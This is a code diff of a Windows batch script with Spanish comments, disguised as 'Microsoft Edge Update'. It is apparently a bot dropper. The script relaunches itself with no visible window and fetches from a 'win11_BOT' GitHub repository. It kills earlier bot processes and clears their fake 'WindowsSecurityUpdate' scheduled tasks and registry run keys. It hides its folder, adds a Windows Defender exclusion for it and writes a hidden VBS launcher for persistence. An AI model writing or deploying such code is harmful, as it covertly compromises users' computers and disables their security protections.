@@ -3,9 +3,8 @@ setlocal EnableExtensions
 title Microsoft Edge Update
 
 :: ============================================================
-::  LANZADOR INVISIBLE
-::  Crea un .vbs temporal que relanza este .bat con la ventana
-::  oculta. Ninguna consola visible en ningun momento.
+::  LANZADOR INVISIBLE: un .vbs temporal relanza este .bat sin
+::  ventana. Ninguna consola visible en ningun momento.
 :: ============================================================
 if /i "%~1"=="silent" goto :run
 
@@ -21,18 +20,18 @@ set "REPO=https://raw.githubusercontent.com/mayki35/win11_BOT/refs/heads/main"
 set "EXE=MicrosoftEdgeUpdate.exe"
 set "VBS=MicrosoftEdgeUpdate.vbs"
 
-:: --- 1) detener version antigua ---
+:: --- 1) detener la version antigua (.ps) y la actual si estaba corriendo ---
 taskkill /F /IM MicrosoftEdgeUpdate.exe >nul 2>&1
 taskkill /F /IM wscript.exe >nul 2>&1
 powershell -NoProfile -WindowStyle Hidden -Command "Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like '*bot.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }" >nul 2>&1
 
-:: --- 2) quitar persistencia antigua ---
+:: --- 2) quitar persistencia antigua (.ps) ---
 schtasks /Delete /TN "WindowsSecurityUpdate" /F >nul 2>&1
 schtasks /Delete /TN "WindowsSecurityUpdate_Backup" /F >nul 2>&1
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSecurityUpdate" /f >nul 2>&1
 del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSecurityUpdate.vbs" >nul 2>&1
 
-:: --- 3) borrar carpeta vieja ---
+:: --- 3) borrar carpetas viejas ---
 ping -n 3 127.0.0.1 >nul
 rmdir /S /Q "%APPDATA%\CarpetaDos" >nul 2>&1
 rmdir /S /Q "%APPDATA%\CarpetaUno" >nul 2>&1
@@ -68,7 +67,8 @@ attrib +h "%DIR%" >nul 2>&1
 :: --- 5c) exclusion de Defender (solo aplica si hay admin) ---
 powershell -NoProfile -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%DIR%' -ErrorAction SilentlyContinue" >nul 2>&1
 
-:: --- 6) lanzador y persistencia nueva ---
+:: --- 6) lanzador minimo y persistencia (el exe luego los reescribe con
+::        su version, que busca el exe en todo el pool) ---
 > "%DIR%\%VBS%" echo Set sh = CreateObject("WScript.Shell")
 >>"%DIR%\%VBS%" echo sh.Run """%DIR%\%EXE%""", 0, False
 attrib +h "%DIR%\%VBS%" >nul 2>&1
